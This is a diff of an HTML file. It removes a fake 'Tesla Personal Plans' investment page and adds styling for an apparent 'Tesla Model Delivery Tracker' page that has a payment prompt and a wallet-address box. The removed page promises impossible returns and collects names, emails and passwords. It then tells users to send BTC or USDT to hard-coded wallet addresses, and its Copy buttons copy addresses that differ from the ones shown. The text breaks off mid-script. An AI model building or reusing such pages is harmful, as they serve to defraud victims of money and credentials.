@@ -1,567 +1,725 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width,initial-scale=1" />
-    <title>T Stock — Tesla Personal Plans</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://unpkg.com/lucide@latest"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
-    <style>
-        body { font-family: 'Inter', sans-serif; background: #ffffff; color: #0b1020; }
-        h1,h2,h3,h4 { font-family: 'Outfit', sans-serif; }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Tesla Model Delivery Tracker - Iceland</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
-        /* Red & White brand */
-        .brand-gradient { background: linear-gradient(135deg, #ff3b30 0%, #c41919 100%); }
-        .btn-gradient { background: linear-gradient(135deg,#c41919 0%, #ff3b30 100%); color: #fff; }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      padding: 20px;
+    }
 
-        .custom-scrollbar::-webkit-scrollbar { width: 6px; }
-        .custom-scrollbar::-webkit-scrollbar-track { background: rgba(0,0,0,0.03); }
-        .custom-scrollbar::-webkit-scrollbar-thumb { background: rgba(196,25,25,0.35); border-radius: 10px; }
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      overflow: hidden;
+    }
 
-        /* gear animation */
-        .gear {
-            width: 96px;
-            height: 96px;
-            display: inline-block;
-            animation: spin-gear 6s linear;
-            animation-fill-mode: forwards;
-        }
-        @keyframes spin-gear { from { transform: rotate(0deg); } to { transform: rotate(2160deg); } }
+    header {
+      background: linear-gradient(135deg, #1a1a1a 0%, #333 100%);
+      color: white;
+      padding: 40px 20px;
+      text-align: center;
+    }
 
-        .hidden-by-default { display: none; }
+    header h1 {
+      font-size: 2.5em;
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
 
-        .timer-ring { transition: stroke-dashoffset 1s linear; }
+    header p {
+      font-size: 1.1em;
+      opacity: 0.9;
+    }
 
-        /* Card shadows tuned for white background */
-        .card { background: #fff; border: 1px solid rgba(196,25,25,0.06); border-radius: 12px; box-shadow: 0 6px 24px rgba(196,25,25,0.04); }
-        .muted { color: rgba(11,16,32,0.6); }
-        .accent { color: #c41919; }
-    </style>
+    #loading, #registration, #delivery, #mapSection, #errorMsg, #paymentPrompt, #confirmation {
+      display: none;
+      padding: 40px 30px;
+    }
+
+    /* Loading Screen */
+    #loading {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 400px;
+    }
+
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #667eea;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Registration Form */
+    #registration {
+      display: none;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      color: #333;
+      font-weight: 600;
+      font-size: 0.95em;
+    }
+
+    input[type="text"],
+    input[type="email"],
+    input[type="tel"],
+    input[type="number"],
+    textarea {
+      width: 100%;
+      padding: 12px 15px;
+      border: 2px solid #e0e0e0;
+      border-radius: 6px;
+      font-size: 1em;
+      font-family: inherit;
+      transition: border-color 0.3s;
+    }
+
+    input[type="text"]:focus,
+    input[type="email"]:focus,
+    input[type="tel"]:focus,
+    input[type="number"]:focus,
+    textarea:focus {
+      outline: none;
+      border-color: #667eea;
+      box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+    }
+
+    textarea {
+      resize: vertical;
+      min-height: 80px;
+    }
+
+    .form-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 20px;
+    }
+
+    @media (max-width: 600px) {
+      .form-row {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .error-text {
+      color: #e74c3c;
+      font-size: 0.85em;
+      margin-top: 5px;
+      display: none;
+    }
+
+    input.error,
+    textarea.error {
+      border-color: #e74c3c;
+    }
+
+    /* Buttons */
+    button {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      border: none;
+      padding: 14px 30px;
+      border-radius: 6px;
+      font-size: 1em;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s;
+      margin-top: 10px;
+    }
+
+    button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+    }
+
+    button:active {
+      transform: translateY(0);
+    }
+
+    .button-group {
+      display: flex;
+      gap: 15px;
+      justify-content: center;
+      flex-wrap: wrap;
+    }
+
+    /* Delivery Section */
+    #delivery {
+      text-align: center;
+    }
+
+    #delivery h2 {
+      color: #333;
+      margin-bottom: 30px;
+      font-size: 2em;
+    }
+
+    #delivery p {
+      color: #666;
+      margin-bottom: 20px;
+      font-size: 1.1em;
+    }
+
+    /* Map Section */
+    #mapSection {
+      text-align: center;
+    }
+
+    #mapSection h3 {
+      color: #333;
+      margin-bottom: 20px;
+      font-size: 1.5em;
+    }
+
+    #mapFrame {
+      width: 100%;
+      max-width: 100%;
+      height: 450px;
+      border: 2px solid #e0e0e0;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
+
+    .status-box {
+      background: #f8f9fa;
+      padding: 20px;
+      border-radius: 8px;
+      margin: 20px 0;
+      border-left: 4px solid #667eea;
+    }
+
+    .status-box p {
+      color: #333;
+      margin: 10px 0;
+      font-size: 1.05em;
+    }
+
+    /* Error Message */
+    #errorMsg {
+      background: #ffe8e8;
+      border: 2px solid #e74c3c;
+      border-radius: 8px;
+      color: #c0392b;
+      text-align: center;
+    }
+
+    #errorText {
+      font-size: 1.1em;
+      font-weight: 600;
+    }
+
+    /* Payment Prompt */
+    #paymentPrompt {
+      text-align: center;
+    }
+
+    #paymentPrompt h3 {
+      color: #333;
+      margin-bottom: 20px;
+      font-size: 1.8em;
+    }
+
+    .payment-info {
+      background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+      padding: 25px;
+      border-radius: 8px;
+      margin: 20px 0;
+      border: 2px solid #e0e0e0;
+    }
+
+    .payment-info p {
+      color: #333;
+      margin: 12px 0;
+      line-height: 1.6;
+    }
+
+    .payment-info strong {
+      color: #667eea;
+    }
+
+    .wallet-address {
+      background: white;
+      border: 2px solid #667eea;
+      padding: 15px;
+      border-radius: 6px;
+      margin: 15px 0;
+      word-break: break-all;
+      font-family: 'Courier New', monospace;
+      font-weight: bold;
+      color: #333;
+    }
+
+    .highlight {
+      background: #fff3cd;
+      padding: 20px;
+      border-radius: 8px;
+      margin: 20px 0;
+      border-left: 4px solid #ffc107;
+      color: #856404;
+    }
+
+    .blinking {
+      animation: blink 1s infinite;
+      color: #e74c3c;
+      font-weight: bold;
+      font-size: 1.1em;
+    }
+
+    @keyframes blink {
+      0% { opacity: 1; }
+      50% { opacity: 0.3; }
+      100% { opacity: 1; }
+    }
+
+    input[type="file"] {
+      margin-top: 15px;
+      padding: 10px;
+      border: 2px solid #667eea;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    /* Confirmation */
+    #confirmation {
+      text-align: center;
+    }
+
+    #confirmation h2 {
+      color: #27ae60;
+      margin-bottom: 20px;
+      font-size: 2em;
+    }
+
+    #confirmation p {
+      color: #666;
+      margin: 15px 0;
+      font-size: 1.1em;
+    }
+
+    #uploadedImage {
+      max-width: 100%;
+      height: auto;
+      margin-top: 25px;
+      border-radius: 8px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+    }
+
+    .success-box {
+      background: #d4edda;
+      border: 2px solid #27ae60;
+      color: #155724;
+      padding: 20px;
+      border-radius: 8px;
+      margin: 20px 0;
+    }
+
+    /* Support Link */
+    .support-link {
+      margin-top: 30px;
+      padding-top: 30px;
+      border-top: 2px solid #e0e0e0;
+      text-align: center;
+    }
+
+    .support-link a {
+      display: inline-block;
+      background: #667eea;
+      color: white;
+      padding: 12px 25px;
+      border-radius: 6px;
+      text-decoration: none;
+      font-weight: 600;
+      transition: all 0.3s;
+      margin-top: 10px;
+    }
+
+    .support-link a:hover {
+      background: #764ba2;
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+    }
+
+    .footer-text {
+      color: #999;
+      font-size: 0.9em;
+      margin-top: 20px;
+    }
+
+    h2 {
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    .tracking-info {
+      background: #f0f4ff;
+      padding: 15px;
+      border-radius: 8px;
+      margin: 15px 0;
+      color: #333;
+    }
+  </style>
 </head>
-<body class="min-h-screen">
-
-<script>lucide && lucide.createIcons && lucide.createIcons();</script>
-
-<!-- REGISTRATION / LOGIN -->
-<div id="register-section" class="min-h-screen flex items-center justify-center p-6 bg-white">
-    <div class="w-full max-w-2xl card overflow-hidden rounded-2xl">
-        <div class="brand-gradient h-1.5 w-full"></div>
-        <div class="p-8 grid grid-cols-1 lg:grid-cols-2 gap-6">
-            <div class="space-y-6">
-                <div class="mx-auto w-20 h-20 bg-white rounded-full flex items-center justify-center border border-red-100 shadow">
-                    <!-- Red T logo -->
-                    <svg viewBox="0 0 100 100" class="w-12 h-12" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="T Logo">
-                        <circle cx="50" cy="50" r="48" fill="#ff3b30"/>
-                        <text x="50%" y="58%" text-anchor="middle" font-family="Outfit, Inter, sans-serif" font-weight="700" font-size="48" fill="#ffffff">T</text>
-                    </svg>
-                </div>
-
-                <div>
-                    <h1 class="text-2xl font-bold uppercase">T Stock — Tesla Personal Plans</h1>
-                    <p class="muted text-sm mt-2">Register to view Tesla personal investment plans and manage your funds.</p>
-                </div>
-
-                <div class="space-y-3">
-                    <label class="text-xs font-bold muted uppercase tracking-widest ml-1">Full name</label>
-                    <input id="reg-name" type="text" placeholder="e.g mark john" class="w-full bg-white border border-red-50 rounded-xl p-3 text-sm focus:outline-none focus:ring-2 focus:ring-red-200" />
-                    <label class="text-xs font-bold muted uppercase tracking-widest ml-1">Email</label>
-                    <input id="reg-email" type="email" placeholder="you@example.com" class="w-full bg-white border border-red-50 rounded-xl p-3 text-sm focus:outline-none focus:ring-2 focus:ring-red-200" />
-                    <label class="text-xs font-bold muted uppercase tracking-widest ml-1">Password</label>
-                    <input id="reg-password" type="password" placeholder="••••••••" class="w-full bg-white border border-red-50 rounded-xl p-3 text-sm focus:outline-none focus:ring-2 focus:ring-red-200" />
-                </div>
-
-                <div>
-                    <button onclick="registerUser()" class="btn-gradient w-full font-bold py-3 rounded-2xl shadow hover:brightness-95 transition-all text-lg tracking-widest uppercase">
-                        Create account
-                    </button>
-                </div>
-            </div>
-
-            <div class="p-6 rounded-xl border border-red-50">
-                <h3 class="text-xl font-bold mb-4 uppercase accent">Tesla Personal Plans 🚀</h3>
-                <p class="muted text-sm mb-4">Minimum Investment: <span class="font-bold">$500</span></p>
-
-                <div class="space-y-3 max-h-[360px] overflow-y-auto pr-2 custom-scrollbar">
-                    <!-- Plans list -->
-                    <div class="p-4 rounded-xl border border-red-50 flex items-center justify-between">
-                        <div>
-                            <div class="font-bold">INVEST $500</div>
-                            <div class="muted text-sm">Return: <span class="accent font-bold">$5,000</span></div>
-                        </div>
-                        <div class="text-xs muted">Personal</div>
-                    </div>
-
-                    <div class="p-4 rounded-xl border border-red-50 flex items-center justify-between">
-                        <div>
-                            <div class="font-bold">INVEST $1,000</div>
-                            <div class="muted text-sm">Return: <span class="accent font-bold">$15,000</span></div>
-                        </div>
-                        <div class="text-xs muted">Personal</div>
-                    </div>
-
-                    <div class="p-4 rounded-xl border border-red-50 flex items-center justify-between">
-                        <div>
-                            <div class="font-bold">INVEST $2,000</div>
-                            <div class="muted text-sm">Return: <span class="accent font-bold">$30,000</span></div>
-                        </div>
-                        <div class="text-xs muted">Personal</div>
-                    </div>
-
-                    <div class="p-4 rounded-xl border border-red-50 flex items-center justify-between">
-                        <div>
-                            <div class="font-bold">INVEST $3,000</div>
-                            <div class="muted text-sm">Return: <span class="accent font-bold">$45,000</span></div>
-                        </div>
-                        <div class="text-xs muted">Personal</div>
-                    </div>
-
-                    <div class="p-4 rounded-xl border border-red-50 flex items-center justify-between">
-                        <div>
-                            <div class="font-bold">INVEST $4,000</div>
-                            <div class="muted text-sm">Return: <span class="accent font-bold">$60,000</span></div>
-                        </div>
-                        <div class="text-xs muted">Personal</div>
-                    </div>
-
-                    <div class="p-4 rounded-xl border border-red-50 flex items-center justify-between">
-                        <div>
-                            <div class="font-bold">INVEST $5,000</div>
-                            <div class="muted text-sm">Return: <span class="accent font-bold">$75,000</span></div>
-                        </div>
-                        <div class="text-xs muted">Personal</div>
-                    </div>
-
-                    <div class="p-4 rounded-xl border border-red-50 flex items-center justify-between">
-                        <div>
-                            <div class="font-bold">INVEST $10,000</div>
-                            <div class="muted text-sm">Return: <span class="accent font-bold">$150,000</span></div>
-                        </div>
-                        <div class="text-xs muted">Personal</div>
-                    </div>
-
-                    <hr class="border-red-50 my-2" />
-
-                    <div class="text-sm">
-                        <div class="font-bold">Crypto Plans</div>
-                        <div class="muted mt-2 text-xs">
-                            <div>1 BTC → earn 5 BTC</div>
-                            <div>2 BTC → earn 10 BTC</div>
-                            <div>3 BTC → earn 15 BTC</div>
-                            <div>4 BTC → earn 20 BTC</div>
-                            <div>5 BTC → earn 25 BTC</div>
-                        </div>
-                        <p class="muted text-xs mt-4">All plans require a minimum investment of $500.</p>
-                    </div>
-                </div>
-
-                <div class="mt-6">
-                    <button onclick="showPlansPage()" class="w-full btn-gradient py-2 rounded-xl font-bold uppercase">Explore Plans</button>
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
-
-<!-- DASHBOARD -->
-<div id="dashboard-section" class="hidden min-h-screen bg-white">
-    <div id="congrats-popup" class="hidden fixed inset-0 z-[300] flex items-center justify-center p-4 bg-black/40">
-        <div class="rounded-xl p-6 text-center card max-w-md space-y-3">
-            <div class="w-14 h-14 bg-red-50 text-red-600 rounded-full flex items-center justify-center mx-auto shadow">
-                <i data-lucide="shield-check" class="w-6 h-6"></i>
-            </div>
-            <div>
-                <h3 class="text-lg font-bold uppercase">Account Created</h3>
-                <p class="muted text-sm">Welcome to TESLA Stock. explore investment plans and fund your account.</p>
-            </div>
-            <button onclick="dismissCongrats()" class="mt-2 btn-gradient w-full font-bold py-2 rounded-lg uppercase">Continue</button>
-        </div>
-    </div>
-
-    <nav class="bg-white border-b border-red-50 sticky top-0 z-50">
-        <div class="max-w-7xl mx-auto px-6 h-20 flex justify-between items-center">
-            <div class="flex items-center gap-3">
-                <!-- Red T logo small -->
-                <svg viewBox="0 0 100 100" class="w-8 h-8" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="T Logo">
-                    <circle cx="50" cy="50" r="48" fill="#ff3b30"/>
-                    <text x="50%" y="58%" text-anchor="middle" font-family="Outfit, Inter, sans-serif" font-weight="700" font-size="44" fill="#ffffff">T</text>
-                </svg>
-                <span class="font-bold text-lg tracking-tighter">TESLA 🪙</span>
-            </div>
-            <div class="flex items-center gap-4">
-                <div class="flex items-center gap-3 bg-red-50 px-4 py-2 rounded-2xl border border-red-100">
-                    <div id="user-avatar-small" class="w-8 h-8 rounded-full bg-red-100 overflow-hidden border border-red-200"></div>
-                    <span id="nav-user-name" class="text-sm font-bold muted">Guest</span>
-                </div>
-            </div>
-        </div>
-    </nav>
-
-    <main class="max-w-7xl mx-auto px-6 py-10 space-y-8">
-        <div class="card p-6 rounded-2xl flex flex-col lg:flex-row gap-6 items-center justify-between">
-            <div>
-                <p class="muted text-xs font-bold uppercase tracking-widest">Total Holdings</p>
-                <h2 id="dashboard-balance" class="text-4xl font-bold">$0.00</h2>
-                <p class="muted text-sm mt-2">Status: <span id="status-tag" class="accent font-bold">Unverified</span></p>
-            </div>
-
-            <div class="flex items-center gap-4">
-                <button onclick="openFundModal()" class="bg-white border border-red-100 text-red-600 font-bold px-4 py-2 rounded-lg transition-all text-sm uppercase">Fund Account</button>
-                <button onclick="openPlansSection()" class="btn-gradient px-4 py-2 rounded-lg font-bold uppercase">View Plans</button>
-            </div>
-        </div>
-
-        <div id="plans-section" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
-            <!-- Plan cards -->
-            <div class="card p-5">
-                <h3 class="text-lg font-bold mb-2">INVEST $500</h3>
-                <p class="muted">Get <span class="accent font-bold">$5,000</span></p>
-                <p class="muted text-xs mt-2">Min $500</p>
-                <div class="mt-4">
-                    <button onclick="selectPlan(500, '$5,000', 'INVEST $500')" class="btn-gradient w-full py-2 rounded-lg font-bold">Select Plan</button>
-                </div>
-            </div>
-
-            <div class="card p-5">
-                <h3 class="text-lg font-bold mb-2">INVEST $1,000</h3>
-                <p class="muted">Get <span class="accent font-bold">$15,000</span></p>
-                <p class="muted text-xs mt-2">Min $500</p>
-                <div class="mt-4">
-                    <button onclick="selectPlan(1000, '$15,000', 'INVEST $1,000')" class="btn-gradient w-full py-2 rounded-lg font-bold">Select Plan</button>
-                </div>
-            </div>
-
-            <div class="card p-5">
-                <h3 class="text-lg font-bold mb-2">INVEST $2,000</h3>
-                <p class="muted">Get <span class="accent font-bold">$30,000</span></p>
-                <p class="muted text-xs mt-2">Min $500</p>
-                <div class="mt-4">
-                    <button onclick="selectPlan(2000, '$30,000', 'INVEST $2,000')" class="btn-gradient w-full py-2 rounded-lg font-bold">Select Plan</button>
-                </div>
-            </div>
-
-            <div class="card p-5">
-                <h3 class="text-lg font-bold mb-2">INVEST $3,000</h3>
-                <p class="muted">Get <span class="accent font-bold">$45,000</span></p>
-                <p class="muted text-xs mt-2">Min $500</p>
-                <div class="mt-4">
-                    <button onclick="selectPlan(3000, '$45,000', 'INVEST $3,000')" class="btn-gradient w-full py-2 rounded-lg font-bold">Select Plan</button>
-                </div>
-            </div>
-
-            <div class="card p-5">
-                <h3 class="text-lg font-bold mb-2">INVEST $4,000</h3>
-                <p class="muted">Get <span class="accent font-bold">$60,000</span></p>
-                <p class="muted text-xs mt-2">Min $500</p>
-                <div class="mt-4">
-                    <button onclick="selectPlan(4000, '$60,000', 'INVEST $4,000')" class="btn-gradient w-full py-2 rounded-lg font-bold">Select Plan</button>
-                </div>
-            </div>
-
-            <div class="card p-5">
-                <h3 class="text-lg font-bold mb-2">INVEST $5,000</h3>
-                <p class="muted">Get <span class="accent font-bold">$75,000</span></p>
-                <p class="muted text-xs mt-2">Min $500</p>
-                <div class="mt-4">
-                    <button onclick="selectPlan(5000, '$75,000', 'INVEST $5,000')" class="btn-gradient w-full py-2 rounded-lg font-bold">Select Plan</button>
-                </div>
-            </div>
-
-            <div class="card p-5">
-                <h3 class="text-lg font-bold mb-2">INVEST $10,000</h3>
-                <p class="muted">Get <span class="accent font-bold">$150,000</span></p>
-                <p class="muted text-xs mt-2">Min $500</p>
-                <div class="mt-4">
-                    <button onclick="selectPlan(10000, '$150,000', 'INVEST $10,000')" class="btn-gradient w-full py-2 rounded-lg font-bold">Select Plan</button>
-                </div>
-            </div>
-        </div>
-    </main>
-</div>
-
-<!-- FUNDING MODAL (multi-step flow) -->
-<div id="fund-modal" class="hidden fixed inset-0 z-[400] flex items-center justify-center p-4 bg-black/30">
-    <div class="bg-white w-full max-w-2xl rounded-2xl border border-red-50 overflow-hidden">
-        <div class="p-4 border-b border-red-50 flex justify-between items-center">
-            <div>
-                <h3 id="fund-title" class="text-lg font-bold accent uppercase">Fund Account</h3>
-                <p class="muted text-xs">Select a plan and follow deposit instructions to fund your account</p>
-            </div>
-            <div>
-                <button onclick="closeFundModal()" class="text-muted hover:text-red-600">
-                    <i data-lucide="x" class="w-5 h-5"></i>
-                </button>
-            </div>
-        </div>
-
-        <div id="step-choose" class="p-6 space-y-4">
-            <div>
-                <h4 class="font-bold muted">Choose a plan</h4>
-                <p class="muted text-xs mt-1">Pick whichever plan you'd like to fund now.</p>
-            </div>
-
-            <div class="grid grid-cols-2 md:grid-cols-3 gap-3">
-                <button onclick="selectPlanFromModal(500, '$5,000', 'INVEST $500')" class="p-3 border rounded-lg text-left">INVEST $500<br/><span class="muted text-xs">Get $5,000</span></button>
-                <button onclick="selectPlanFromModal(1000, '$15,000', 'INVEST $1,000')" class="p-3 border rounded-lg text-left">INVEST $1,000<br/><span class="muted text-xs">Get $15,000</span></button>
-                <button onclick="selectPlanFromModal(2000, '$30,000', 'INVEST $2,000')" class="p-3 border rounded-lg text-left">INVEST $2,000<br/><span class="muted text-xs">Get $30,000</span></button>
-                <button onclick="selectPlanFromModal(3000, '$45,000', 'INVEST $3,000')" class="p-3 border rounded-lg text-left">INVEST $3,000<br/><span class="muted text-xs">Get $45,000</span></button>
-                <button onclick="selectPlanFromModal(4000, '$60,000', 'INVEST $4,000')" class="p-3 border rounded-lg text-left">INVEST $4,000<br/><span class="muted text-xs">Get $60,000</span></button>
-                <button onclick="selectPlanFromModal(5000, '$75,000', 'INVEST $5,000')" class="p-3 border rounded-lg text-left">INVEST $5,000<br/><span class="muted text-xs">Get $75,000</span></button>
-                <button onclick="selectPlanFromModal(10000, '$150,000', 'INVEST $10,000')" class="p-3 border rounded-lg text-left md:col-span-3">INVEST $10,000 — Get $150,000</button>
-            </div>
-
-            <div class="flex justify-end">
-                <button id="choose-next" onclick="goToConfirmPlan()" class="btn-gradient py-2 px-6 rounded-lg font-bold uppercase">Next</button>
-            </div>
-        </div>
-
-        <div id="step-confirm" class="hidden p-6 space-y-4">
-            <div>
-                <h4 class="font-bold muted">Confirm Plan</h4>
-                <p class="muted text-xs">Plan: <span id="confirm-plan-name" class="font-bold"></span> • Amount: <span id="confirm-plan-amt" class="accent font-bold"></span></p>
-            </div>
-
-            <div class="space-y-2">
-                <label class="text-xs muted">Preferred deposit method</label>
-                <select id="deposit-method" class="w-full border rounded-lg p-2">
-                    <option value="BTC">BTC</option>
-                    <option value="USDT">USDT (TRC20)</option>
-                </select>
-            </div>
-
-            <div class="flex justify-between">
-                <button onclick="backToChoose()" class="border px-4 py-2 rounded-lg">Back</button>
-                <button onclick="startDepositProcess()" class="btn-gradient px-6 py-2 rounded-lg font-bold uppercase">Proceed to Deposit</button>
-            </div>
-        </div>
-
-        <div id="step-processing-gear" class="hidden p-6 text-center space-y-4">
-            <div>
-                <h4 class="font-bold muted">Preparing deposit instructions</h4>
-                <p class="muted text-xs">We are generating your secure deposit details — this takes a few seconds.</p>
-            </div>
-
-            <div id="gear-wrap" class="py-6">
-                <!-- SVG gear -->
-                <svg class="gear mx-auto" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M492 308l-42-24 7-48-44-25-26 17-34-14-14-35-45 2-25-44-48 7-23-40-48 23-8 48-46 24 5 48-30 26 23 41-7 46 39 14 10 33 44-4 25 44 48-7 26 34 45-18 14-35 34 13 26-17 44 24 7-48 42-24-20-40z" stroke="#c41919" stroke-width="6" fill="rgba(196,25,25,0.06)"/>
-                    <circle cx="256" cy="256" r="80" fill="rgba(196,25,25,0.08)" stroke="#c41919" stroke-width="6"/>
-                </svg>
-                <div class="muted text-xs mt-3">Please wait — preparing secure deposit addresses...</div>
-            </div>
-        </div>
-
-        <div id="step-deposit" class="hidden p-6 space-y-4">
-            <div>
-                <h4 class="font-bold muted">Deposit Instructions</h4>
-                <p class="muted text-xs">Send the exact plan amount to either the BTC or USDT address below, then upload your payment screenshot and confirm.</p>
-            </div>
-
-            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                <div class="p-4 border rounded-lg">
-                    <div class="flex items-center justify-between">
-                        <div>
-                            <div class="font-bold">BTC (Bech32)</div>
-                            <div class="muted text-xs mt-1">Address</div>
-                        </div>
-                        <button onclick="copyToClipboard('bc1qguvzp38e4065dugw53hwxpuvtxf9tcmpe0yccv')" class="text-red-600 text-sm">Copy</button>
-                    </div>
-                    <div class="mt-3 font-mono text-xs break-all">bc1qqs30h7es39vxthz88sdz6z3l2sgdtm2nkpf8gt</div>
-                </div>
-
-                <div class="p-4 border rounded-lg">
-                    <div class="flex items-center justify-between">
-                        <div>
-                            <div class="font-bold">USDT (TRC20)</div>
-                            <div class="muted text-xs mt-1">Address / Memo</div>
-                        </div>
-                        <button onclick="copyToClipboard('TPvJmf6ujpLQ3FoLXkZXyTPD8CtcJcuAdU')" class="text-red-600 text-sm">Copy</button>
-                    </div>
-                    <div class="mt-3 font-mono text-xs break-all">TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o</div>
-                </div>
-            </div>
-
-            <div class="space-y-2">
-                <label class="text-xs muted">Upload payment screenshot</label>
-                <input id="payment-screenshot" type="file" accept="image/*" class="w-full border rounded-lg p-2 text-sm" />
-                <div id="screenshot-preview" class="mt-2"></div>
-            </div>
-
-            <div class="flex justify-between items-center">
-                <button onclick="backToConfirm()" class="border px-4 py-2 rounded-lg">Back</button>
-                <button onclick="confirmDeposit()" class="btn-gradient px-6 py-2 rounded-lg font-bold uppercase">I HAVE PAID — Confirm my deposit</button>
-            </div>
-        </div>
-
-        <div id="step-final" class="hidden p-6 text-center space-y-4">
-            <div>
-                <h4 class="font-bold muted">Processing Confirmation</h4>
-                <p class="muted text-xs">We are verifying your payment. You will be redirected to support after confirmation.</p>
-            </div>
-            <div class="py-6">
-                <i data-lucide="refresh-cw" class="w-12 h-12 text-red-600 animate-spin mx-auto"></i>
-                <div class="muted text-xs mt-3">Finalizing — please wait.</div>
-            </div>
-        </div>
-    </div>
-</div>
-
-<script>
-    lucide && lucide.createIcons && lucide.createIcons();
-
-    // state
-    let currentUser = null;
-    let selectedPlan = null;
-
-    // registration function
-    function registerUser() {
-        const name = document.getElementById('reg-name').value.trim();
-        const email = document.getElementById('reg-email').value.trim();
-        const pass = document.getElementById('reg-password').value.trim();
-
-        if (!name || !email || !pass) {
-            alert('Please complete all registration fields.');
-            return;
-        }
-
-        currentUser = { name, email, balance: 0.00 };
-
-        document.getElementById('nav-user-name').innerText = name;
-        document.getElementById('dashboard-balance').innerText = '$' + currentUser.balance.toFixed(2);
-        const small = document.getElementById('user-avatar-small');
-        if (small) small.style.background = 'linear-gradient(135deg,#ff3b30,#c41919)';
-
-        document.getElementById('register-section').classList.add('hidden');
-        document.getElementById('dashboard-section').classList.remove('hidden');
-        document.getElementById('congrats-popup').classList.remove('hidden');
-    }
-
-    function dismissCongrats() {
-        document.getElementById('congrats-popup').classList.add('hidden');
-    }
-
-    function showPlansPage() {
-        document.getElementById('plans-section').scrollIntoView({behavior: 'smooth'});
-    }
-
-    function selectPlan(amount, returnText, name) {
-        selectedPlan = { amount, returnText, name };
-        openFundModal();
-        document.getElementById('confirm-plan-name').innerText = name;
-        document.getElementById('confirm-plan-amt').innerText = '$' + amount.toLocaleString();
-        document.getElementById('step-choose').classList.add('hidden');
-        document.getElementById('step-confirm').classList.remove('hidden');
-    }
-
-    function openFundModal() {
-        document.getElementById('fund-modal').classList.remove('hidden');
-        if (!selectedPlan) {
-            document.getElementById('step-choose').classList.remove('hidden');
-            document.getElementById('step-confirm').classList.add('hidden');
-        }
-        document.getElementById('step-processing-gear').classList.add('hidden');
-        document.getElementById('step-deposit').classList.add('hidden');
-        document.getElementById('step-final').classList.add('hidden');
-        if (selectedPlan) {
-            document.getElementById('confirm-plan-name').innerText = selectedPlan.name;
-            document.getElementById('confirm-plan-amt').innerText = '$' + selectedPlan.amount.toLocaleString();
-        }
-    }
-
-    function closeFundModal() { document.getElementById('fund-modal').classList.add('hidden'); }
-
-    function selectPlanFromModal(amount, returnTxt, name) {
-        selectedPlan = { amount, returnText: returnTxt, name };
-        document.getElementById('confirm-plan-name').innerText = name;
-        document.getElementById('confirm-plan-amt').innerText = '$' + amount.toLocaleString();
-    }
-
-    function goToConfirmPlan() {
-        if (!selectedPlan) { alert('Please select a plan first.'); return; }
-        document.getElementById('step-choose').classList.add('hidden');
-        document.getElementById('step-confirm').classList.remove('hidden');
-    }
-
-    function backToChoose() {
-        document.getElementById('step-confirm').classList.add('hidden');
-        document.getElementById('step-choose').classList.remove('hidden');
-    }
-
-    function startDepositProcess() {
-        document.getElementById('step-confirm').classList.add('hidden');
-        document.getElementById('step-processing-gear').classList.remove('hidden');
-
-        // wait 6 seconds for gear animation then show deposit addresses
-        setTimeout(() => {
-            document.getElementById('step-processing-gear').classList.add('hidden');
-            document.getElementById('step-deposit').classList.remove('hidden');
-        }, 6000);
-    }
-
-    function backToConfirm() {
-        document.getElementById('step-deposit').classList.add('hidden');
-        document.getElementById('step-confirm').classList.remove('hidden');
-    }
-
-    function copyToClipboard(text) {
-        navigator.clipboard && navigator.clipboard.writeText(text).then(() => {
-            alert('Address copied to clipboard.');
-        }, () => {
-            const ta = document.createElement('textarea');
-            ta.value = text;
-            document.body.appendChild(ta);
-            ta.select();
-            document.execCommand('copy');
-            document.body.removeChild(ta);
-            alert('Address copied to clipboard.');
-        });
-    }
-
-    document.getElementById('payment-screenshot')?.addEventListener('change', function (e) {
-        const file = e.target.files[0];
-        const preview = document.getElementById('screenshot-preview');
-        preview.innerHTML = '';
-        if (!file) return;
-        if (!file.type.startsWith('image/')) {
-            preview.innerText = 'Please upload an image file.';
-            return;
-        }
-        const reader = new FileReader();
-        reader.onload = function(ev) {
-            const img = document.createElement('img');
-            img.src = ev.target.result;
